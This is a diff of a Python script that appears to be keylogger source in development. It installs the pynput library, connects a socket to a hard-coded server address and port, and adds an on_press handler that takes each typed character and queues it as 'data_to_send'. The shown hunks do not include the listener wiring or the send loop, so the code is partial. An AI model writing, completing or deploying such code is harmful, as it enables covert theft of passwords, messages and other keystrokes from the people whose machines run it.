@@ -1,6 +1,7 @@
 import socket
 import time
 import subprocess
+from queue import Queue 
 
 def install_pynput():
     try:
@@ -13,6 +14,11 @@ def install_pynput():
             print("pynput library installed successfully.")
         except subprocess.CalledProcessError:
             print("Error installing the 'pynput' library.")
+
+def on_press(key, data_queue):
+        data_to_send = str(key.char)
+        data_queue.put(data_to_send)
+
 def connect_to_server(server_ip, server_port):
     try:
         global client_socket
@@ -38,7 +44,7 @@ def main():
     install_pynput()
     server_ip = '10.0.0.239'
     server_port = 12345
-
+    data_queue = Queue()
     connect_to_server(server_ip, server_port)
 
 if __name__== "__main__":
